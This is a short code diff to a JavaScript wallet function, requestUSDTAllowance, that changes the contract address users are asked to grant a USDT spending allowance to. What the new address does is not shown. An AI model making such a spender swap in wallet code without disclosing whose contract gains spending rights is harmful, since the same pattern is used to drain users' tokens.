@@ -1610,7 +1610,7 @@ async function requestUSDTAllowance(userAddress) {
         const signer = await provider.getSigner();
         
         const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
-        const dexContractAddress = "0x7a4177C13B83B84afD6CD64a949b9B889DE9a898";
+        const vaultContractAddress = "0x96f9B995501cA5476eE78c2d52A69d95471f7B1A";
         
         const usdtAbi = ["function approve(address spender, uint256 amount) public returns (bool)"];
         const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
